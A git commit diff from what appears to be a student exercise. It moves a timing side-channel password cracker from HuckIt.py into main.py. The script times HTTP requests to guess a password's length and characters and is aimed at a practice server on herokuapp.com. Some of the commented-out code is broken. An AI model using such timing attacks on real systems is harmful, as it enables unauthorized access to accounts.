085f66271a60e9eb7571b2ad61ad9977cf54cea2
Agam <agamyafe10@gmail.com>
2020-11-16 16:04:59 +0200

    add

--- HuckIt.py
+++ HuckIt.py
@@ -1,41 +1,44 @@
-import time
-import requests
-import numpy as np
-
-def timeit(url2check, repeat=1):
-    tt = []
-    for _ in range(repeat):
-        start = time.time()
-        requests.get(url2check, allow_redirects=True)
-        end = time.time()
-        tt.append(end - start)
-    return tt
-
-#find the apssword length
-#logic: search for average highest duration
-#assumption: duration for the correct length is higher than for length for incorrect length
-def find_pass_len(pswd_start_len=1, url, MAX_LEN):
-    checks = []
-    check_len = pswd_start_len
-    while check_len < MAX_LEN:
-        url1 = url + '/' + ("").ljust(check_len, '_')
-        checks.append(min(timeit(url1, 10)))
-        print(f'Checking password length {check_len}: min time {checks[-1]}')
-        check_len += 1
-    idx = checks.index(max(checks))
-    idx += pswd_start_len
-    print(f"Password length found: {idx}")
-    return(idx)
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
-
-def find_tav(pswd_length, partly_pswd = "", url):
-    checks = []
-    POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-    for tav in POOL:
-        url1 = url + '/' + partly_pswd + tav + ("").ljust(pswd_length - len(partly_pswd) - 1, '_')
-        checks.append(min(timeit(url1, 10)))
-        print(f'Checking part password {partly_pswd + tav}: min time {checks[-1]}')
-    idx = checks.index(max(checks))
-    tav_found = POOL[idx]
-    print(f"Password part found: {partly_pswd}{tav_found}")
-    return tav_found
+# import time
+# import requests
+# import numpy as np
+#
+# def timeit(url2check, repeat=1):
+#     tt = []
+#     for _ in range(repeat):
+#         start = time.time()
+#         requests.get(url2check, allow_redirects=True)
+#         end = time.time()
+#         tt.append(end - start)
+#     return tt
+#
+# #find the apssword length
+# #logic: search for average highest duration
+# #assumption: duration for the correct length is higher than for length for incorrect length
+# def find_pass_len(pswd_start_len, url, MAX_LEN):
+#     time_values = []
+#     for tav in POOL:
+#
+#     check_len = pswd_start_len
+#     while check_len < MAX_LEN:
+#         url1 = url + '/' + ("").ljust(check_len, '_')
+#         checks.append(min(timeit(url1, 10)))
+#         print(f'Checking password length {check_len}: min time {checks[-1]}')
+#         check_len += 1
+#     idx = checks.index(max(checks))
+#     idx += pswd_start_len
+#     print(f"Password length found: {idx}")
+#     return(idx)
+# # See PyCharm help at https://www.jetbrains.com/help/pycharm/
+#
+#
+# def find_tav(pswd_length, partly_pswd = "", url =""):
+#     checks = []
+#     POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+#     for tav in POOL:
+#         url1 = url + '/' + partly_pswd + tav + ("").ljust(pswd_length - len(partly_pswd) - 1, '_')
+#         checks.append(min(timeit(url1, 10)))
+#         print(f'Checking part password {partly_pswd + tav}: min time {checks[-1]}')
+#     idx = checks.index(max(checks))
+#     tav_found = POOL[idx]
+#     print(f"Password part found: {partly_pswd}{tav_found}")
+#     return tav_found
--- main.py
+++ main.py
@@ -1,10 +1,32 @@
 import time
 import requests
-from HuckIt import find_pass_len, find_tav
+import numpy as np
+# from HuckIt import find_pass_len, find_tav
+
+
+def timeit(url2check, repeat=1):
+    tt = []
+    for _ in range(repeat):
+        start = time.time()
+        requests.get(url2check, allow_redirects=True)
+        end = time.time()
+        tt.append(end - start)
+    return tt
+
+
+def find_pass_len(url, MAX_LEN):
+    time_values = []
+    for num in range(1, MAX_LEN+1, 1):
+        executed_url = url + '/' + ("").ljust(num, '*')# defining the password to sent
+        time_values.append(min(timeit(executed_url, 5)))# add the time it took to the current password
+        print(f'checking length: {num} the time it took: {time_values[-1]}')
+    standart_devitation = np.std(time_values)# getting the standart_devitation from the list
+    average = np.mean(time_values)# getting the average from the list
+    for curr_time in time_values:# running over the times to checks if there is one which unusual
+        if curr_time - average > 1.5 * standart_devitation:
+            return time_values.index(curr_time)
 
 if __name__ == '__main__':
-    MAX_LEN = 32
-
     GAL_SITE = True
 
     if GAL_SITE:
@@ -17,8 +39,9 @@ if __name__ == '__main__':
 
         POOL = '0123456789'
 
-    pswd_len = find_pass_len( url, MAX_LEN)
-    temp_pswd = ""
-    for i in range(pswd_len):
-        temp_pswd += find_tav(pswd_len, temp_pswd)
-    print("the password is : " + temp_pswd)
+    pswd_len = find_pass_len("https://passwordserver.herokuapp.com/", 10)
+    print(pswd_len)
+    # temp_pswd = ""
+    # for i in range(pswd_len):
+    #     temp_pswd += find_tav(pswd_len, temp_pswd)
+    # print("the password is : " + temp_pswd)
